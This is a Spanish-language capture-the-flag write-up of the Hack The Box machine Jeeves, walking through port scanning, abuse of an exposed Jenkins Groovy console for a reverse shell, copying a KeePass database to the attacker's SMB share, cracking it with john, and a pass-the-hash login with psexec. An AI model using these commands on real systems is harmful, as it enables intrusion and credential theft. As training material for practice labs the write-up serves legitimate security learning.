

![1](</Writeups/Maquinas/Jeeves/img/logo.png>)
By Rug4lo

## Reconocimiento 

Primero que todo vamos a realzar un escaneo con Nmap para ver los puertos abiertos 

```bash
nmap -p- --open -sS -min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.63
```

```bash
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-16 23:21 CEST
Initiating SYN Stealth Scan at 23:21
Scanning 10.10.10.63 [65535 ports]
Discovered open port 80/tcp on 10.10.10.63
Discovered open port 135/tcp on 10.10.10.63
Discovered open port 445/tcp on 10.10.10.63
Discovered open port 50000/tcp on 10.10.10.63
Completed SYN Stealth Scan at 23:22, 39.53s elapsed (65535 total ports)
Nmap scan report for 10.10.10.63
Host is up, received user-set (0.042s latency).
Scanned at 2023-10-16 23:21:58 CEST for 39s
Not shown: 65531 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
50000/tcp open  ibm-db2      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 39.63 seconds
           Raw packets sent: 196628 (8.652MB) | Rcvd: 36 (2.040KB)
```

Podemos ver que el puerto 80 esta abierto, por lo que vamos a revisar la pagina web

![1](</Writeups/Maquinas/Jeeves/img/1.png>)

Podemos probar a buscar algo, pero si nos fijamos en el código de la pagina, no mandara ninguna peticion, solo te saldrá una foto de un error

![1](</Writeups/Maquinas/Jeeves/img/2.png>)

Por lo que podemos ver no hay mucho mas es esta pagina, pero si nos fijamos en el escaneo de Nmap veremos que el puerto 5000 esta abierto, así que vamos a echar un vistazo 

![1](</Writeups/Maquinas/Jeeves/img/3.png>)

Si entramos nos salta un error, aunque tenemos la version que usa podemos antes hacer un descubrimiento de directorios con feroxbuster (si usas una lista mas pequeña que esta no te saldrá el directorio)

```bash
feroxbuster -u http://10.10.10.63:50000 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

```bash
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.63:50000
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
302        0l        0w        0c http://10.10.10.63:50000/askjeeves
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/about
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/search
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/security
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/projects
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/people
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/version
302        0l        0w        0c http://10.10.10.63:50000/askjeeves/assets
200        0l        0w        0c http://10.10.10.63:50000/askjeeves/about/index
```

## Explotación de Jenkins

Viendo que tenemos un /askjeeves podemos entrar y ver un entorno de administración, en el cual tenemos un apartado para ejecutar comandos con propósitos de debugging

![1](</Writeups/Maquinas/Jeeves/img/4.png>)

Dentro de esta consola podemos probar a entablarnos una reverse shell, de esta manera, primero vamos a donde tenemos el netcat.exe en nuestro equipo, una vez allí levantamos un servidor SMB

```bash
smbserver.py smbFolder $(pwd) -smb2sup
```

Con este servidor creado nos ponemos en escucha con netcat

```bash
nc -nlvp 4444
```

Ahora tenemos que conseguir ejecutar comandos, pero esta consola solo ejecuta código Groovy, después de buscar como ejecutar comandos de shell en este lenguaje me encontré esta manera

![1](</Writeups/Maquinas/Jeeves/img/5.png>)

Vale, con esto preparado podemos ejecutar este comando para entablarnos la reverse shell

![1](</Writeups/Maquinas/Jeeves/img/6.png>)

Si vemos la terminal donde estabamos en escucha,  tendremos la reverse shell

![1](</Writeups/Maquinas/Jeeves/img/7.png>)

Ahora podemos ir al escritorio del usuario Kohsuke y visualizar la flag

![1](</Writeups/Maquinas/Jeeves/img/8.png>)

## Escalada de privilegios

Vale, ahora a por la root, para escalar privilegios podremos encontrar un archivo .kdbx en la carpeta Documentos del usuario Kohsuke, esta extension se usa para los archivos de contraseñas de KeePass 

![1](</Writeups/Maquinas/Jeeves/img/9.png>)

Este tipo de archivos contienen las contraseñas, pero para acceder a estas hay que introducir una contraseña, viendo esto podemos probar a hacer fuerza bruta, a ver si averiguamos la contraseña, para esto lo primero sera pasarnos el archivo a nuestro equipo de esta manera (teniendo el servidor SBM activo)

```bash
copy CEH.kdbx \\10.10.14.7\smbFolder\CEH.kdbx
```

Ahora que tenemos el archivo podemos usar la herramienta keepass2john para conseguir un hash el cual vamos a deshashear con john

```bash
keepass2john CEH.kdbx
```

```bash
$keepass$*2*6000*0*1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d*3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091*393c97beafd8a820db9142a6a94f03f6*b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff*cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
```

Creamos un archivo llamado hash el cual contenga el output de anterior comando, y usamos john con el rockyou.txt para la fuerza bruta

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Con la contraseña ahora podemos entrar en el archivo 

![1](</Writeups/Maquinas/Jeeves/img/10.png>)

Podemos probar una a una con [[Crackmapexec]] si las contraseñas son correctas, y veremos que no hay ninguna correcta

```bash
crackmapexec smb 10.10.10.63 -u 'Administrator' -p '1234'
```

Pero si nos fijamos en la primera veremos que parece ser un hash, probamos a meter el hash en el [[Crackmapexec]]

![1](</Writeups/Maquinas/Jeeves/img/11.png>)

Vemos que nos pone el Pwn3d! por lo que el hash es correcto!, ahora podemos probar a conectarnos a la maquina con este hash haciendo uso de la herramienta Psexec

![1](</Writeups/Maquinas/Jeeves/img/12.png>)

Ahora podemos ir tranquilamente a por la root.txt...

![1](</Writeups/Maquinas/Jeeves/img/13.png>)

Bueno... la flag esta algo mas escondida, pero no mucho, si hacermos un descubrimiento de directorios ocultos veremos la flag

![1](</Writeups/Maquinas/Jeeves/img/14.png>)

Para leerla seria simplemente:

```bash
more < hm.txt:root.txt
```